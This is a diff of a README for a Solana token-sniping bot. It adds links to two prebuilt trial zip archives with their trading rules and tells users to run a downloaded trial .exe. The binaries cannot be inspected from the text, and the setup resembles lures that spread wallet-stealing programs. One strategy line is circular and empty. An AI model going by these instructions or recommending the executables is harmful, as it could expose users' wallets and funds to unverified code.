@@ -59,15 +59,23 @@ src/
 └── main.rs
 ```
 ---
-## Trial Version
-🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18796920/solana-raypump-sniper.trial.zip)
+## Trial Versions
+### Trading Strategies
+> 🗂️ [solana-raypump-sniper(executioner-trial).zip](https://github.com/user-attachments/files/18854180/solana-raypump-sniper.executioner-trial.zip)
 
-### Trading Strategy
-
-- Monitor for user purchases of $1,000 tokens; execute a buy order at that point.
-- Monitor for user sales of $300 tokens; execute a sell order at that point.
-- If a position remains open for more than 60 seconds, initiate an automatic sell.
+1. Monitor for user purchases of $1,000 tokens; execute a buy order at that point.
+2. Monitor for user sales of $300 tokens; execute a sell order at that point.
+3. If a position remains open for more than 60 seconds, initiate an automatic sell.
 (Note: Both the $1,000 and $300 thresholds, as well as the 60-second time frame, are adjustable parameters.)
+
+> 🗂️ [solana-raypump-sniper(qwert-trial).zip](https://github.com/user-attachments/files/18854181/solana-raypump-sniper.qwert-trial.zip)
+
+1.  **Entry:**  Enter a position based on your position.
+2.  **Time Limit:** A time limit of 3-5 minutes is set after entering a position. During this time, monitor the volume and the number of transactions.
+3.  **Exit - Time-Based (3 Minute Exit):** If the volume does not increase after 3 minutes, sell.
+4.  **Exit - Growth Activated:** If volume growth begins, the time-based rule is disabled.
+    *   **Take Profit (TP):** Set 5-7 Take Profit orders.
+    *   **Stop Loss (SL):** Set a Stop Loss at 50% below the entry price.
 
 ### How To Run
 1. Environment Variables Settings
@@ -94,7 +102,7 @@ TOKEN_AMOUNT=0.000001
 0x1234567890abcdef1234567890abcdef12345678
 0xabcdef1234567890abcdef1234567890abcdef12
 ```
-3. Run `raypump-bot.exe`.
+3. Run `solana-raypump-sniper(trial).exe`.
 
 ![image](https://github.com/user-attachments/assets/dffc8e4b-cd00-4921-8488-e25230f4a31a)
 
